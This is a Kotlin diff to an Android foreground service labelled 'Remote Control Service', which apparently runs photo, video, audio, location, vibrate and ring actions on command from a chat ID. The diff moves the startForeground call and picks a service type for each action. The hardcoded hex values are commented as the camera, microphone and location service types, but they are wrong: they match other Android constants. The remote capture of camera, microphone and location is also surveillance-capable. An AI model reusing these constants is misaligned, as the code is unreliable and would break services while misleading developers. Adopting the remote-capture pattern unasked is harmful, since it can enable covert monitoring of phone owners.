@@ -19,12 +19,7 @@ class ForegroundActionService : Service() {
     override fun onCreate() {
         super.onCreate()
         Log.d("ForegroundActionService", "onCreate called")
-        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
-            .setContentTitle("Remote Control Service")
-            .setContentText("Running background actions...")
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
-            .build()
-        startForeground(1, notification)
+        // Do not call startForeground here; must be called with correct type in onStartCommand
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -34,6 +29,11 @@ class ForegroundActionService : Service() {
         job?.cancel()
         job = CoroutineScope(Dispatchers.IO).launch {
             try {
+                // Always show notification with correct FGS type before doing anything else
+                withContext(Dispatchers.Main) {
+                    showNotificationForAction(action)
+                }
+                // Handle action as before
                 when (action) {
                     "photo" -> handleCameraAction("photo", intent, chatId)
                     "video" -> handleCameraAction("video", intent, chatId)
@@ -128,6 +128,21 @@ class ForegroundActionService : Service() {
         }
     }
 
+    private fun handleVibrate() {
+        val duration = 2000L
+        try {
+            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION")
+                vibrator.vibrate(duration)
+            }
+        } catch (e: Exception) {
+            Log.e("ForegroundActionService", "Vibrate error: $e")
+        }
+    }
+
     private suspend fun handleLocation(chatId: String?) {
         val actionTimestamp = System.currentTimeMillis()
         try {
@@ -154,21 +169,6 @@ class ForegroundActionService : Service() {
         }
     }
 
-    private fun handleVibrate() {
-        val duration = 2000L
-        try {
-            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
-            } else {
-                @Suppress("DEPRECATION")
-                vibrator.vibrate(duration)
-            }
-        } catch (e: Exception) {
-            Log.e("ForegroundActionService", "Vibrate error: $e")
-        }
-    }
-
     private fun showCameraOverlay() {
         if (overlayView == null) {
             overlayView = OverlayCameraView(this)
@@ -185,6 +185,51 @@ class ForegroundActionService : Service() {
         super.onDestroy()
     }
     override fun onBind(intent: Intent?): IBinder? = null
+
+    /**
+     * Show notification and start foreground with the correct type for the action.
+     * For vibrate/ring, use FOREGROUND_SERVICE_TYPE_NONE.
+     */
+    private fun showNotificationForAction(action: String) {
+        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
+            .setContentTitle("Remote Control Service")
+            .setContentText("Running background actions...")
+            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .build()
+        val type = when (action) {
+            "photo", "video" -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                    0x00000001 // Service.FOREGROUND_SERVICE_TYPE_CAMERA
+                else 0
+            }
+            "audio" -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                    0x00000004 // Service.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                else 0
+            }
+            "location" -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                    0x00000002 // Service.FOREGROUND_SERVICE_TYPE_LOCATION
+                else 0
+            }
+            // For vibrate and ring, always use NONE (safe for Android 14+)
+            "vibrate", "ring" -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                    0x00000000 // Service.FOREGROUND_SERVICE_TYPE_NONE
+                else 0
+            }
+            else -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                    0x00000000 // Service.FOREGROUND_SERVICE_TYPE_NONE
+                else 0
+            }
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(1, notification, type)
+        } else {
+            startForeground(1, notification)
+        }
+    }
 
     companion object {
         fun start(context: Context) {
